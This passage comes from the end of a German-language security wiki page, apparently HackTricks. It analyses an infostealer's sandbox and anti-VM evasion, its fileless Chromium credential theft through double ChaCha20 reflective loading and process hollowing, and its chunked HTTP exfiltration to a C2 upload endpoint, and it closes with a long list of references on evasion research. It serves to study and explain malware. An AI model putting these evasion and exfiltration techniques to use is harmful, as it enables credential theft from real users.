    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Geschichtete `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes. Sie berechnet die Prüfsumme erneut für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kurze Betriebszeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping aufzuspüren. Bei einem Treffer wird abgebrochen, bevor die Module gestartet werden.

### Fileless-Helper + doppeltes ChaCha20-Reflective Loading

- Die primäre DLL/EXE bettet einen Chromium-Credential-Helper ein, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt wurde (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) stammen.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden direktes Syscall-reflective Process Hollowing, um Code in einen laufenden Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln – trotz der ABE-Härtung.

### Modulare In-Memory-Erfassung & chunked HTTP-Exfil

- `create_memory_based_log` durchläuft eine globale Funktionszeigertabelle `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt die Ergebnisse in gemeinsam genutzte Puffer und meldet nach einem Join-Zeitfenster von etwa 45 Sekunden seine Dateianzahl.
- Anschließend wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. Beim letzten Chunk wird `complete: true` angehängt, damit der C2 weiß, dass der Zusammenbau abgeschlossen ist.

## References

- [1] [Erweiterte Evasion-Taktiken: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Aufrufstapel: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC zum Spoofing von Aufrufstapeln](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung von DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollten Sie Ihrem Zero Trust vertrauen? Umgehung der Zscaler-Posture-Prüfungen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in frühere Ransomware-Aktivitäten von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) abwehren](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum mklink-Befehl](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung von Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mithilfe von API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Dornröschen: Adaptix mit Crystal Palace schlafen legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Manipulation von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Dornröschen II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet Etw verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Einsätzen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Den Remediation-Treiber von Defender als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Erstellen eines Kindprozesses mit umgeleiteter Ein- und Ausgabe](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-Proof-of-Concept und Quellcode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Interna des Thread-Pools für shellcodeless DLL-Injection missbrauchen](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-Benchmark-Dataset und thrember-Tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 zur Bewertung von Red-Team-Implants verwenden](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Erkennung durch Machine Learning umgehen](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – XAML-basiertes .NET-Ladeframework NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-Enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-Methode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
